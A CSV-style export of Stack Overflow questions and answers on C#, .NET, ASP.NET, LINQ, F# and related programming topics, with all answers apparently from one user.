<p><sub>The following solution is <em>not recommended</em> for use in production code. If you really hate such a fundamental construct in C#, you might consider switching to VB or some other language.</sub></p>

<p>In case one desperately hates the cast syntax, he/she can write an extension method to mimic the cast:</p>

<pre><code>public static T To&lt;T&gt;(this object o) { // Name it as you like: As, Cast, To, ...
    return (T)o;
}
</code></pre>

<p>and use a neat[?] syntax:</p>

<pre><code>obj.To&lt;SomeType&gt;().SomeMethod()
</code></pre>
"
"<p>I'm not sure this is even possible, but here goes: I have a class <code>Zoo</code> which holds a dictionary of Animal Type -> List of Animals. e.g.</p>

<pre><code>Cat Type -&gt; {Cat1, Cat2}
Zebra Type -&gt; {Zebra1, Zebra2}
</code></pre>

<p><code>Cat</code> and <code>Zebra</code> are subclasses of <code>Animal</code>. Now <code>Zoo</code> has a method <code>IList&lt;Animal&gt;</code> <code>GetAnimalsOfType(Type type)</code>.</p>

<p>I'd like the return value to be of the type of the animal requested, so instead of getting an <code>IList&lt;Animal&gt;</code> I'd get an <code>IList&lt;Cat&gt;</code> or an <code>IList&lt;Zebra&gt;</code> depending on the type of animal I passed in the type parameter.</p>

<p>Is this possible? If so how?</p>
","33708","","<p>Yes, something like this is certainly possible using generics. I think you're looking for this:</p>

<pre><code>IList&lt;T&gt; GetAnimalsOfType&lt;T&gt;() where T : Animal {
    return dictionary[typeof(T)].OfType&lt;T&gt;().ToList();
}
</code></pre>

<p>There's a difference between this and what you mentioned in the question. The type is <em>not</em> passed as an argument. Since the argument is passed at runtime, it doesn't make sense if it returns an strongly typed list. The compiler wouldn't know anyway and you wouldn't be able to use it.</p>
"
"<p>I have to return a JsonResult, which contains some HTML.</p>

<p>so, something like:</p>

<pre><code>return Json(new { id=""guid"", html=""&lt;param id='id'/&gt;"" });
</code></pre>

<p>However, when I get the result back , the angle brackets are encoded as u003e, u003c
, etc..</p>

<p>I tried various encoders but can't figure this one out. Anyone run into this?</p>

<p>I can return a Content(string) with the Response.ContentType = ""application/json"" without this issue, but my json object is pretty complex and I would prefer to return a JsonResult if possible.</p>

<p>Thanks!</p>
","33708","","<p>This is done to prevent potential XSS attacks by inserting malicious HTML tags in your data. It shouldn't have a functional difference for you. <code>""\uxxxx""</code> represents the same character as the unencoded version.</p>
"
"<p>I understand that I can redirect a user on an exception by setting the customErrors element in the Web.config</p>

<pre><code>&lt;customErrors mode=""On"" defaultRedirect=""/WebTest/ErrorPages/AppError.html""&gt;
&lt;/customErrors&gt;
</code></pre>

<p>I could also do a <code>Response.Redirect</code> in the <code>Application_Error</code> event in the Global.asax file.</p>

<p>What are the differences between these 2 approaches and which one is preferred?</p>
","33708","","<p>If you don't want to do anything with the error (such as logging), you'd better simply use the configuration file. It's simpler and easier to reconfigure. Moreover, using the configuration file has the advantage of supporting <code>RemoteOnly</code> type, where you can easily see the exception on the server for diagnostics purposes but others won't be able to see it.</p>

<p>In general, there's no point in writing code for something that's perfectly configurable and is built in the system. Code is more prone to errors than configuration options.</p>
"
"<p>Has anyone worked with a programmer with a radically different coding style?  How do you jive together without wanting to delete and rewrite each others code?</p>
","33708","","<p>We agree on a standard coding style and enforce it in the form of Visual Studio settings files.</p>
"
"<p>Right now A website for NON PROFIT organization developed using ALL FREE open source technologies. ( Apache, Php , Mysql )
We really want to change ( Rewrite)  it to Microsoft  asp.net 3.5.
Do I need to buy licensed copy of  .net ? can I use free express edition?
Being a non profit organization, Budget is the main problem.
How can I develop a website in asp.net economically?
Your help is appreciated.
Thank you!!</p>
","33708","","<p>.NET Framework is a free product (as in beer). Of course, you need a valid Windows license to use that. </p>

<p>Visual Studio Express Editions are really capable of building complex applications.</p>

<p>The real problem might come down to SQL Server. While there's a free Express Edition, it has database size limitations (4GB/database) and it can only use a single processor and 1GB RAM. <em>If you have a large amount of data</em>, that part can become expensive. Of course, you can still use MySQL as your data store.</p>

<p>That said, it's possible to host ASP.NET apps on Linux with <a href=""http://www.mono-project.com"" rel=""nofollow"">Mono</a> and Apache.  </p>
"
"<p>Is it possible, from .NET, to mimic the exact randomization that Java uses?  I have a seed, and I would like to be able to recieve the same results in both C# and Java when creating a random number.</p>
","33708","","<p>If you have the source code of the <code>java.util.Random</code> class for your Java implementation, you can easily port it to .NET.</p>

<p><strike>If you require both applications (Java and .NET) to use a certain random number generator, you'd better implement one in both platforms and use it instead, as the system provided version might change its behavior as a result of an update.</strike>(Looks like the Java specification precisely describes the behavior of its PRNG.)</p>
"
"<p>The <code>IDictionary&lt;TKey, TValue&gt;</code> in .NET 4 / Silverlight 4 does not support covariance, i.e. I can't do a</p>

<pre><code>IDictionary&lt;string, object&gt; myDict = new Dictionary&lt;string, string&gt;();
</code></pre>

<p>analog to what I can do with <code>IEnumerable&lt;T&gt;</code>s now.</p>

<p>Probably boils down to the <code>KeyValuePair&lt;TKey, TValue&gt;</code> not being covariant either. I feel that covariance should be allowed in dictionaries at least for the values.</p>

<p>So is that a bug or a feature? Will it ever come, maybe in .NET 37.4?</p>

<p>UPDATE (2 years later):</p>

<p>There will be an <a href=""http://msdn.microsoft.com/en-us/library/hh136548%28v=VS.110%29.aspx""><code>IReadOnlyDictionary&lt;TKey, TValue&gt;</code></a> in .NET 4.5, but it won't be covariant either <code>:Â·/</code>, because it derives from <code>IEnumerable&lt;KeyValuePair&lt;TKey, TValue&gt;&gt;</code>, and <code>KeyValuePair&lt;TKey, TValue&gt;</code> is not an interface and thus cannot be covariant.</p>

<p>The BCL team would have to redesign a lot to come up and use some <code>ICovariantPair&lt;TKey, TValue&gt;</code> instead. Also strongly-typed indexers Ã¡ la <code>this[TKey key]</code> aren't possible for covariant interfaces. A similar end can only be achieved by placing an extension method <code>GetValue&lt;&gt;(this IReadOnlyDictionary&lt;TKey, TValue&gt; self, TKey key)</code> somewhere which would somehow internally have to call an an actual implementation, which arguably looks like a quite messy approach.</p>
","33708","","<p>It's a feature. .NET 4.0 only supports <strong>safe</strong> covariance. The cast you mentioned is potentially dangerous as you could add a non-string element to the dictionary if that was possible:</p>

<pre><code>IDictionary&lt;string, object&gt; myDict = new Dictionary&lt;string, string&gt;();
myDict[""hello""] = 5; // not an string
</code></pre>

<p>On the other hand, <code>IEnumerable&lt;T&gt;</code> is a read-only interface. The <code>T</code> type parameter is only in its output positions (return type of the <code>Current</code> property) so it's safe to treat <code>IEnumerable&lt;string&gt;</code> as an <code>IEnumerable&lt;object&gt;</code>.</p>
"
"<p>I was wondering if anyone knows if you can run the iPhone SDK on an iPad. Tried looking through apple.com, but didn't find anything useful...</p>

<p>I want to be able to develop -- from start to finish -- an iPhone app on the iPad and was wondering if that's possible...</p>
","33708","","<p>That's unlikely (read: practically impossible). iPhone SDK and Xcode developer tools are designed to run on Mac OS X on Intel x86 processors. iPad's processor is a 1GHz ARM processor. It's a different architecture and is inadequate for running those tools effectively anyway. (This can change if Apple can and be willing to develop a version of said developer tools natively for iPhone OS with sufficient performance).</p>

<p>You can use a text editor on an iPad to write code but you are not likely to be able to compile, test, and debug it.</p>

<hr>

<p>By the way, in case the device can be jailbroken, you'd be able to run native gcc for iPhone OS to compile your app (as you can currently do with an iPhone/iPod touch too). You won't be able to use Apple's proprietary tools like Interface Builder but you'd be able to compile Objective-C sources and test and debug your app.</p>
"
"<p>If I have the following scenario</p>

<pre><code>public interface IFace
{
     int NoseSize {get; set;}
}


public class Face: IFace
{
    private int NoseSize;

    public int IFace.NoseSize
    {
        get { return ClassLevel.NoseSize}
        set { ClassLevel.NoseSize = value}
    }
}
</code></pre>

<p>How do I really indicate ""ClassLevel""?</p>
","33708","","<p>Simply refer to it as <code>NoseSize</code> or <code>this.NoseSize</code> if you like. </p>

<hr>

<p>By the way, you are not correctly implementing the interface. If you want to use explicit interface implementation, you cannot specify an access modifier. </p>

<p>If you want to implement the interface implicitly, you should omit the interface name and simply have a public member that matches the interface member name and signature. Of course, if you do that, you can't have an identically named field in the same class.</p>
"
"<p>I am learning C++/CLI and attempting to build an Interop component for my C# project.  I'm not sure what this error means or how to resolve it?  Any ideas?</p>

<pre><code>#pragma once

using namespace System;

namespace Firewall {

    public ref class Firewall
    {
        void StartFirewall(){};
    }
}
</code></pre>
","33708","","<p>Unlike C#, C++ requires a semicolon after a type definition.</p>

<pre><code>public ref class Firewall
{
    void StartFirewall(){} // doesn't require semicolon here
}; // needs semicolon here.
</code></pre>

<p><sub>In C#, you <em>can</em> actually have semicolons after type definitions (not recommended though) and that will be ignored. It is there for the sake of consistency with C++ syntax.</sub></p>
"
"<p>What Linq expression would I use to select the 1rst overloaded method that accepts a single string parameter?</p>

<p>For example to return the DateTime.ToString(string format) instead of the DateTime.ToString(IFormatProvider provider).</p>

<pre><code>t = typeof(DateTime);
string[] validMethods = { ""ToString"" };
return t.GetMethods().Where(a =&gt; validMethods.Contains(a.Name) &amp; a.GetParameters().Length == 1).ToArray();
</code></pre>
","33708","","<p>You can check the whole parameter list with a <code>SequenceEqual</code> call:</p>

<pre><code>t = typeof(DateTime);
string[] validMethods = { ""ToString"" };
Type[] parameters = { typeof(string) };
return t.GetMethods()
        .Where(a =&gt; validMethods.Contains(a.Name) &amp;&amp;
                    a.GetParameters().Select(p =&gt; p.ParameterType)
                                     .SequenceEqual(parameters)).ToArray();
</code></pre>
"
"<p>i have a login form</p>

<p><img src=""http://fc02.deviantart.net/fs71/f/2010/029/a/2/stuff_by_junaid_saeed.png"" alt=""alt text""></p>

<p>what i want is that after i have filled the password field when i press ""Enter"", it performs some action, some set of lines of code, in my case the same that the ""Login button does"". how to do it</p>
","33708","","<p>Set the form's <code>AcceptButton</code> to the ""Log In"" button and write the ""lines of code"" that perform the login in its click handler.</p>

<p>You can disable the ""Log In"" button if the username or password is not filled in. Wire up the <code>TextChanged</code> event of both textbox object to an event handler that does this:</p>

<pre><code> void UserNameOrPasswordTextChanged(object sender, EventArgs e) {
     loginButton.Enabled = !string.IsNullOrEmpty(userNameTextBox.Text) &amp;&amp;
                           !string.IsNullOrEmpty(passwordTextBox.Text);
 }
</code></pre>

<p>Handling the Enter key press only in the password field can be very nonintuitive to the user. Assume he fills the password box and moves back to the username field to correct a typo and then presses Enter. It won't work if you have just handled KeyPress for password textbox and checked for it and this will make the user frustrated.</p>
"
"<p>The <a href=""http://www.w3.org/TR/REC-html40/struct/links.html#h-12.4""><strong>base</strong></a> HTML element provides a base for relative URIs in the HTML. Must JavaScript and CSS also honor it for relative URIs issued in them: </p>

<p>E.g. </p>

<p>JavaScript:</p>

<pre><code>location.href = ""mypage.htm""` 
</code></pre>

<p>CSS:</p>

<pre><code>h4 { 
    background-image: url(myimage.gif) 
}
</code></pre>

<p>(in any browser?)</p>
","33708","","<p>CSS paths are always (except when IE6 is buggy and stupid and tries to load <code>.htc</code> files specified in CSS <code>behavior</code> attributes relative to the document) relative to the stylesheet itself and have no dependence on the HTML location. For other stuff, <code>&lt;base&gt;</code> will affect the perceived current directory of the HTML as if the file was located in the directory defined by base. Consequently, it does affect things like <code>location.href=...;</code>. By the way, inline styles and style information in <code>&lt;style&gt;</code> element are loaded relative to the document location. Those are affected by the <code>&lt;base&gt;</code> tag, of course.</p>
"
"<p>On a LINQ-result you like this:</p>

<pre><code>var result = from x in Items select x;
List&lt;T&gt; list = result.ToList&lt;T&gt;();
</code></pre>

<p>However, the <code>ToList&lt;T&gt;</code> is Really Slow, does it make the list mutable and therefore the conversion is slow? </p>

<p>In most cases I can manage to just have my <code>IEnumerable</code> or as <code>Paralell.DistinctQuery</code> but now I want to bind the items to a DataGridView, so therefore I need to as something else than <code>IEnumerable</code>, suggestions on how I will gain performance on ToList or any replacement?</p>

<p>On 10 milion records in the <code>IEnumerable</code>, the <code>.ToList&lt;T&gt;</code> takes about 6 seconds..</p>
","33708","","<p><code>.ToList()</code> is slow in comparison to <em>what</em>?</p>

<p>If you are comparing </p>

<pre><code>var result = from x in Items select x;
List&lt;T&gt; list = result.ToList&lt;T&gt;();
</code></pre>

<p>to</p>

<pre><code>var result = from x in Items select x;
</code></pre>

<p>you should note that since the query is evaluated lazily, the first line doesn't do much at all. It doesn't retrieve any records. <em>Deferred execution</em> makes this comparison <em>completely unfair</em>.</p>
"
"<p>What happens first in the pipeline: a URL Rewrite (as defined in the URL Rewrite module of IIS), or a HttpHandler (added with the add managed handler functionality of IIS7)?</p>
","33708","","<p>The rewrite module goes first. It intercepts the request before any handler is selected for it and rewrites the URL so that the handler can be selected based on the new URL.</p>

<p><a href=""http://learn.iis.net/page.aspx/496/iis-url-rewriting-and-aspnet-routing/""><img src=""http://learn.iis.net/file.axd?i=1156"" alt=""IIS URL Rewrite in IIS Pipeline Diagram""></a></p>
"
"<p>This is a bit complex - so here we go. </p>

<p>I am developing a mobile web application using asp.net mvc and I need to test it locally on my iPhone. So far I have the first iteritaion of the site running on my local dev laptop. I created a virtual dir for the site under IIS 7 on the same machine. I deployed the site to that folder from VS2008. I open a browser and entered ""HTTP://localhost/mysite"" and the site cam up just fine. I am runnig a home network with locked down WIFI and both the laptip and my iPhone are on the network. So now I want to test with the iPhone but the site won't come up when browsing to ""HTTP://laptopname/mysite"". I have another machine that is also on the network and I get this error message when attempting to browse to the site:</p>

<p>""Website (laptopname) is online but isn't responding to connection attempts""</p>

<p>I have a feeling that this has something to do with IIS setting and \ or application pools but have not been able to find anything relavent goolging. Any help appreciated.</p>
","33708","","<p>There are some possibilities:</p>

<ol>
<li>iPhone is not able to resolve your laptop by name. Try using the IP address of your computer in the URL instead.</li>
<li>The firewall on the laptop is blocking inbound connections from other machines. Check your firewall.</li>
<li>The IIS Website is configured with a host header <code>localhost</code> so it won't respond to requests to other hostnames. Check the binding for the Web site in the IIS Manager.</li>
</ol>

<p>To eliminate possible network issues, you can create an ad hoc WiFi network on your PC and connect to that network to test.</p>
"
"<p>I want to run a subroutine to clear some things up when the user exits the application. I tried looking for a Form_Unload event or anything similar, is there a way to do this?</p>

<p>I open a database connection on <code>Form_Load</code>, and would like to close it when the user exits the app.</p>
","33708","","<p>Most of the time, you should try not to hang on a connection for the lifetime of an application. You should open and close it as needed. If you don't want to close and reopen it as a performance optimization, you don't need to worry about it. Connection pooling for the database driver should handle that.</p>

<p>Anyway, you don't really need to close the connection if the process is going to end. The acquired resources will get released automatically. </p>

<p>If you want to execute code as the form gets closed, you can handle its <code>FormClosing</code> event. If you want the code to execute after a form is closed, handle its <code>FormClosed</code> event.</p>
"
"<p>I am not a visual studio programmer but I need to whip up a quick app to display an image and manipulate it's height and width using a slider.  I've done the quick google and all of the information talks about using picturebox(picbox) as the image containing control but I don't seem to have a picbox control in my VS C# express install.  </p>

<p>Should it be missing?  How do I get it back or install it?  What are my alternatives?</p>
","33708","","<p>If you've looked carefully in the toolbox and couldn't find it, you may have accidentally deleted the icon. Right click on the ""All Windows Forms"" section header in the toolbox and select ""Choose Items"". Check the checkbox near the ""PictureBox"" control. It'll show up in the toolbox. </p>

<p>In WPF, you should be looking for the ""Image"" control instead.</p>
"
"<p>I have several configuration entries for application.
Identical entries are stored in Machine.config/Web.config etc..
How would I determine which one is read at run time..</p>
","33708","","<p>In general, <code>Web.config</code> settings in a folder inherits and can override settings from the <code>Web.config</code> files in parent folders, the application root <code>Web.config</code> file, and the <code>machine.config</code> file. </p>

<p>Consequently, settings in the closest <code>Web.config</code> file take precedence over the root <code>Web.config</code> file and the <code>machine.config</code> file. There's a catch though. You can't define all settings in all places. Some settings can only get defined at <code>machine.config</code> level. Some can be defined at the application root level but not in subfolders.</p>
"
"<p>I was going through <a href=""http://www.asp.net/learn/mvc/tutorial-34-cs.aspx"">Asp.Net MVC lesson</a> and learned that, for a method to qualify as an action for a controller, </p>

<ul>
<li>It must not have an <strong>""open generic type""</strong></li>
</ul>

<p>I understand generics somewhat and use them to some extent, but:</p>

<ul>
<li>What is an <strong>open generic type</strong> in .Net.</li>
<li>Is there such a thing as a <strong>closed generic type</strong>?</li>
<li><strong>Open generic type</strong> is a term not used very often. What is used / confused with it ?</li>
</ul>
","33708","","<p>The C# language defines an open type to be a type that's either a type argument or a generic type defined with unknown type arguments:</p>

<blockquote>
  <p>All types can be classified as either open types or closed types. An <em>open type</em> is a type that involves type parameters. More specifically:  </p>
  
  <ul>
  <li>A type parameter defines an open type.    </li>
  <li>An array type is an open type if and only if its element type is an open type.</li>
  <li>A <em>constructed type</em> is an open type if and only if one or more of its type arguments is an <em>open type</em>. A <em>constructed nested type</em> is an open type if and only if one or more of its type arguments or the type arguments of its containing type(s) is an open type.</li>
  </ul>
  
  <p>A <em>closed type</em> is a type that is not an open type.</p>
</blockquote>

<p>Therefore <code>T</code>, <code>List&lt;T&gt;</code>, and <code>Dictionary&lt;string,T&gt;</code>, and <code>Dictionary&lt;T,U&gt;</code> are all open types (<code>T</code> and <code>U</code> are type arguments) whereas <code>List&lt;int&gt;</code> and <code>Dictionary&lt;string,int&gt;</code> are closed types. </p>

<p>There's a related concept: An <em>unbound generic type</em> is a generic type with unspecified type arguments. An unbound type can't be used in expressions other than <code>typeof()</code> and you can't instantiate it or call its methods. For instance, <code>List&lt;&gt;</code> and <code>Dictionary&lt;,&gt;</code> are unbound types.</p>

<p>To clarify the subtle distinction between an open type and an unbound type:</p>

<pre><code>class Program {
   static void Main() { Test&lt;int&gt;(); }
   static void Test&lt;T&gt;() {
      Console.WriteLine(typeof(List&lt;T&gt;)); // Print out the type name
   }
}
</code></pre>

<p>If you run this snippet, it'll print out</p>

<pre><code>System.Collections.Generic.List`1[System.Int32]
</code></pre>

<p>which is the CLR name for <code>List&lt;int&gt;</code>. It's clear at runtime that the type argument is <code>System.Int32</code>. This makes <code>List&lt;T&gt;</code> a <em>bound</em> open type.</p>

<p>At runtime, you can use reflection to bind type arguments to unspecified type parameters of unbound generic types with the <a href=""http://msdn.microsoft.com/en-us/library/system.type.makegenerictype.aspx""><code>Type.MakeGenericType</code> method</a>:</p>

<pre><code>Type unboundGenericList = typeof(List&lt;&gt;);
Type listOfInt = unboundGenericList.MakeGenericType(typeof(int));
if (listOfInt == typeof(List&lt;int&gt;))
     Console.WriteLine(""Constructed a List&lt;int&gt; type."");
</code></pre>

<p>You can check whether a type is an unbound generic type (<em>generic type definition</em>) from which you can construct bound types with the <a href=""http://msdn.microsoft.com/en-us/library/system.type.isgenerictypedefinition.aspx""><code>Type.IsGenericTypeDefinition</code> property</a>:</p>

<pre><code>Console.WriteLine(typeof(Dictionary&lt;,&gt;).IsGenericTypeDefinition); // True
Console.WriteLine(typeof(Dictionary&lt;int,int&gt;).IsGenericTypeDefinition); // False
</code></pre>

<p>To get the unbound type from a constructed type at runtime, you can use the <a href=""http://msdn.microsoft.com/en-us/library/system.type.getgenerictypedefinition.aspx""><code>Type.GetGenericTypeDefinition</code> method</a>.</p>

<pre><code>Type listOfInt = typeof(List&lt;int&gt;);
Type list = listOfInt.GetGenericTypeDefinition(); // == typeof(List&lt;&gt;)
</code></pre>

<p>Note that for a generic type, you can either have a completely unbound type definition, or a completely bound definition. You can't bind some type parameters and leave others unbound. For instance, you can't have <code>Dictionary&lt;int,&gt;</code> or <code>Dictionary&lt;,string&gt;</code>.</p>
"
"<p>i have this query and i need to get the max value of number and the city</p>

<p>how to do it ?</p>

<pre><code>select city,count(id) as number
from men
group by city
order by number desc
</code></pre>

<p>thank's in advance</p>
","33708","","<p>Simple. Add a <a href=""http://msdn.microsoft.com/en-us/library/ms189463.aspx"" rel=""nofollow""><code>TOP</code> clause</a> to restrict the number of returned rows to 1. Note that parentheses for the top clause are optional in <code>select</code> statements where the number of rows is a constant. If you use anything other than a constant, you'll need parentheses and SQL Server 2005+. However, a <code>top</code> clause with constant number of rows without parentheses works on 2000 too. </p>

<pre><code>select top 1 city,count(id) as number
from men
group by city
order by number desc
</code></pre>
"
"<p>I've been given the following task:</p>

<blockquote>
  <p>Consider the following sequence of hexadecimal values:</p>
  
  <p>55 89 E5 83 EC 08 83 E4 F0 31 C9 BA 01 00 00 00 B8 0D 00 00 00 01 D1 01 CA 48 79 F9 31 C0 C9 C3</p>
  
  <p>This sequence of bytes represents a subroutine in Intel 80386 machine language in 32-bit mode.</p>
  
  <ul>
  <li><p>When the instructions in this subroutine are executed, they leave values in the registers %ecx and %edx. What are the values?</p></li>
  <li><p>What is the program in C that carries out the computation done by this subroutine, then prints the values computed by this program of %ecx and %edx as they would appear at the end of the execution of the subroutine.</p></li>
  </ul>
</blockquote>

<p>As I do not have the 80386 instruction set memorized, I must first convert these opcode bytes into their assembly-language mnemonic equivalents. So, is there an online reference somewhere, a table mapping hex values to instructions or the like? I checked out Intel's website, but could find nothing. Or is there a better way to go about deciphering this...?</p>
","33708","","<p>You should use a disassembler to see what are the instructions. You can grab NDISASM from the <a href=""http://www.nasm.us/"" rel=""nofollow"">NASM package</a>. Store the bytes in a file and run:</p>

<pre><code>ndisasm -b 32 file        # -b 32 specifies you're running in 32 bit mode
</code></pre>
"
"<p>Im tryint ot build a custom validation where I check if the user contains in a role. And I'm having problems with string array, what is best way to check if it contains a specific value?</p>

<pre><code>    public string[] AuthRoles { get; set; }


    public override void OnActionExecuting(ActionExecutingContext filterContext)
    {

        if (AuthRoles.Length &gt; 0)
        {

            if (!filterContext.HttpContext.User.Identity.IsAuthenticated)
            {

               RedirectToRoute(filterContext,
               new
               {
                   controller = ""AdminLogin"",
                   action = ""AdminLogin""
               });

            }
            else
            {
                bool isAuthorized = filterContext.HttpContext.User.IsInRole(this.AuthRoles.??);

                if (!isAuthorized)
                    throw new UnauthorizedAccessException(""You are not authorized to view this page"");
            }
        }
        else
        {
            throw new InvalidOperationException(""No Role Specified"");
        }
</code></pre>

<p>How shall I modify the check for User.IsInRole so it handles the array? .Any, .Contains?</p>

<p>/M</p>
","33708","","<p>If you want the user to have all the roles in the <code>AuthRoles</code> at the same time, you should:</p>

<pre><code>bool isAuthorized =
         Array.TrueForAll(AuthRoles, filterContext.HttpContext.User.IsInRole);
</code></pre>

<p>If just being a member of at least one of the required roles is enough, use <code>Any</code>:</p>

<pre><code>bool isAuthorized = AuthRoles.Any(filterContext.HttpContext.User.IsInRole);
</code></pre>
"
"<p>There are quite a lot of deviations in Java and C# languages, one of which I observed was we cannot add variable constants in an interface. Being from Java background I got baffled to see compilation error when I tried this.</p>

<p>Does anyone has explanation why it is so?</p>
","33708","","<p>A field is an <em>implementation detail</em> of a class and should not be exposed an its interface.
An interface is a way to abstract away implementation details of a class. These two concepts look contradictory and don't really fit together. </p>

<p>You <em>can</em> declare properties in interfaces instead.</p>

<hr>

<p><em><strong>UPDATE (after realizing the question was about constants, not variable fields):</em></strong> I <em>think</em> (purely my personal speculation) that Java decided to allow such a  construct because it didn't have <code>enum</code> types back then. C# has had enums since the beginning and preferred those to constants most of the time. Moreover, you can create a static class in C# and add everything you like in it and ship it along the interface without any real hassles. Supporting such a construct would just make interface definitions more complicated.</p>
"
"<p>I wonder what this means in F#.<br />
<strong>âa function taking an integer, <br />which returns a function which takes an integer and returns an integer.â</strong><br />
But I don't understand this well.<br />
Can anyone explain this so clear ? </p>

<p>[Update]:</p>

<pre><code>&gt; let f1 x y = x+y ;;

 val f1 : int -&gt; int -&gt; int
</code></pre>

<p>What this mean ?</p>
","33708","","<p>It's a function that takes an integer and returns a function that takes an integer and returns an integer.</p>

<p>This is functionally equivalent to a function that takes two integers and returns an integer. This way of treating functions that take multiple parameters is common in functional languages and makes it easy to <em>partially apply</em> a function on a value.</p>

<p>For example, assume there's an add function that takes two integers and adds them together:</p>

<pre><code>let add x y = x + y
</code></pre>

<p>You have a list and you want to add 10 to each item. You'd partially apply <code>add</code> function to the value <code>10</code>. It would bind one of the parameters to 10 and leaves the other argument unbound. </p>

<pre><code>let list = [1;2;3;4]
let listPlusTen = List.map (add 10)
</code></pre>

<p>This trick makes composing functions very easy and makes them very reusable. As you can see, you don't need to write another function that adds 10 to the list items to pass it to <code>map</code>. You have just reused the <code>add</code> function.</p>
"
"<p>I want to write some sort of dictionary that would accept current time 
and return what user-define time period it is. As time-preiod I mean user-defined names for time period that are read from file. For example</p>

<p>8:00-9:00 - breakfast time
9:00-12:00 - work time
12:00-13:00 - lunch time</p>

<p>etc...</p>

<p>Currently I have a function is base on if-else if statements</p>

<pre><code>// C# syntax omitted for simplicity
TimePeriod GetCurrentTimePeriod(DateTime t)
{
 if(t &lt; 8.00)
 {
  return TimePeriod.Sleep;
 }
 else if(t &lt; 9.00)
 { 
   ...
 }
}
</code></pre>

<p>I am not happy with this straight solution. I would prefer use some
sort of ""dictionary"" instead.</p>

<p>PS. Changed the word TimeZone to TimePeriod to avoid confusion with System.TimeZone class.</p>
","33708","","<p>If you need to make those ""periods of time"" dynamically adjustable, I suggest building up a simple List of a record containing start time, end time, and description and simply query that list with LINQ. Since the number of items in that list is probably likely to be very small, linear search does the job and it isn't worth it to bother using binary search or more advanced data structures like segment trees:</p>

<pre><code>class PeriodOfTime { 
   public DateTime StartTime {get; set;}
   public DateTime EndTime {get; set;}
   public string Description {get; set;} // Use your own enum instead
}
// ... 
List&lt;PeriodOfTime&gt; periods = new List&lt;PeriodOfTime&gt;();

var timeToQuery = DateTime.Now.TimeOfDay;
var period = periods.FirstOrDefault(p =&gt; timeToQuery &gt;= p.StartTime &amp;&amp;
                                         timeToQuery &lt;= p.EndTime);
</code></pre>
"
"<p>I have a C# dictionary <code>Dictionary&lt;MyKey, MyValue&gt;</code> and I want to split this into a collection of <code>Dictionary&lt;MyKey, MyValue&gt;</code>, based on <code>MyKey.KeyType</code>. <code>KeyType</code> is an enumeration.</p>

<p>Then I would be left with a dictionary containing key-value pairs where <code>MyKey.KeyType = 1</code>, and another dictionary where <code>MyKey.KeyType = 2</code>, and so on. </p>

<p>Is there a nice way of doing this, such as using Linq?</p>
","33708","","<pre><code>var dictionaryList = 
    myDic.GroupBy(pair =&gt; pair.Key.KeyType)
         .OrderBy(gr =&gt; gr.Key)  // sorts the resulting list by ""KeyType""
         .Select(gr =&gt; gr.ToDictionary(item =&gt; item.Key, item =&gt; item.Value))
         .ToList(); // Get a list of dictionaries out of that
</code></pre>

<p>If you want a dictionary of dictionaries keyed by ""KeyType"" in the end, the approach is similar:</p>

<pre><code>var dictionaryOfDictionaries = 
    myDic.GroupBy(pair =&gt; pair.Key.KeyType)
         .ToDictionary(gr =&gt; gr.Key,         // key of the outer dictionary
             gr =&gt; gr.ToDictionary(item =&gt; item.Key,  // key of inner dictionary
                                   item =&gt; item.Value)); // value
</code></pre>
"
"<p>OK, I've read every question here about strong named assemblies and just want to clarify something.</p>

<p>First though, from what I've read, <a href=""http://en.wikipedia.org/wiki/Global_Assembly_Cache"" rel=""nofollow"">GAC</a> aside, strong named assemblies prevent a malicious third party changing and impersonating your code. It'd be great to have some links to some real world examples of this kind of spoofing that happened pre strong named assemblies.</p>

<p>If security or the GAC are not a concern, it seems that it's still advisable to strong name assemblies because:</p>

<ol>
<li><p>Clients who have strong named assemblies can only reference your assemblies if they are signed.</p></li>
<li><p>Clients who do not have strong named assemblies can reference your assembly whether it's signed or not.</p></li>
</ol>

<p>Is that a fair analysis?</p>
","33708","","<h1>Warning</h1>

<h3>Strong name does not prevent assemblies to be tampered with. You can manipulate a signed assembly and resign it with a new strong name.</h3>

<p>However, like any public key signature system, you need the private key to sign the tampered version <em>without changing its strong name</em>.</p>

<p>Consequently, strong name is not a secure method to make sure someone can't change your code or circumvent your licensing mechanism or anything like that. </p>

<p>Related post: <a href=""http://stackoverflow.com/questions/369248/can-strong-naming-an-assembly-be-used-to-verify-the-assembly-author/369268#369268"">Can strong naming an assembly be used to verify the assembly author?</a></p>

<hr>

<p>Yes, strong named assemblies can only reference strong named assemblies. Assemblies without strong name can reference all assemblies. </p>
"
"<p>Using <a href=""http://www.red-gate.com/products/reflector/"">reflector</a> I have noticed that <a href=""http://System.Linq.Enumerable.Count""><code>System.Linq.Enumerable.Count</code></a> method has a condition in it to optimize it for the case when the <code>IEnumerable&lt;T&gt;</code> passed is in fact an <code>ICollection&lt;T&gt;</code>. If the cast succeeds the Count method does not need to iterate over every element, but can call the Count method of ICollection.</p>

<p>Based on this I was starting to think that <code>IEnumerable&lt;T&gt;</code> can be used like a readonly view of a collection, without having the performance loss that I originally expected based on the API of <code>IEnumerable&lt;T&gt;</code></p>

<p>I was interested whether the optimization of the <code>Count</code> still holds when the <code>IEnumerable&lt;T&gt;</code> is a result of a <code>Select</code> statement over an <code>ICollection</code>, but based on reflected code this case is not optimized, and requires an iteration through all elements.</p>

<p>Do you draw the same conclusions from reflector? What could be the reason behind the lack of this optimization? I seems like there is a lot of time wasted in this common operation. Does the spec <em>require</em> that the each element is evaluated even if the Count can be determined without doing that?</p>
","33708","","<p>It doesn't really matter that the result of <code>Select</code> is lazily evaluated. The <code>Count</code> is always equivalent to the count of the original collection so it could have certainly been retrieved directly by returning a specific object from <code>Select</code> that could be used to short-circuit evaluation of the <code>Count</code> method.</p>

<p>The reason it's not possible to optimize out evaluation of the <code>Count()</code> method on the return value of a <code>Select</code> call from something with determined count (like a <code>List&lt;T&gt;</code>) is that it could change the meaning of the program. </p>

<p>The <code>selector</code> function passed to <code>Select</code> method is allowed to <strong>have side effects</strong> and its side effects are required to happen deterministically, in a predetermined order.</p>

<p>Assume:</p>

<pre><code>new[]{1,2,3}.Select(i =&gt; { Console.WriteLine(i); return 0; }).Count();
</code></pre>

<p>The documentation requires this code to print </p>

<blockquote>
  <p>1<br>
  2<br>
  3</p>
</blockquote>

<p>Even though the count is really known from the start <em>and could be optimized</em>, optimization would change the behavior of the program. That's why you can't avoid enumeration of the collection anyway. That's exactly one of the reasons why compiler optimizations are much easier in pure functional languages.</p>

<hr>

